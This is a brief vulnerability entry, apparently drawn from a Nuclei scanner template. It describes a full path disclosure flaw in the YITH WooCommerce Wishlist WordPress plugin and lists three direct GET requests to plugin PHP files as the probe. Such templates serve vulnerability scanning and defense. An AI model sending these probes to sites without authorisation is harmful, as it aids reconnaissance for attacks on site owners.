# Vulnerability: WordPress YITH WooCommerce Wishlist - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-yith-woocommerce-wishlist-fpd.yaml`)

## Description
WordPress YITH WooCommerce Wishlist plugin is vulnerable to full path disclosure via direct access to plugin files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/yith-woocommerce-wishlist/includes/class-yith-wcwl.php
GET {{BaseURL}}/wp-content/plugins/yith-woocommerce-wishlist/includes/class-yith-wcwl-frontend.php
GET {{BaseURL}}/wp-content/plugins/yith-woocommerce-wishlist/includes/functions-yith-wcwl.php
```

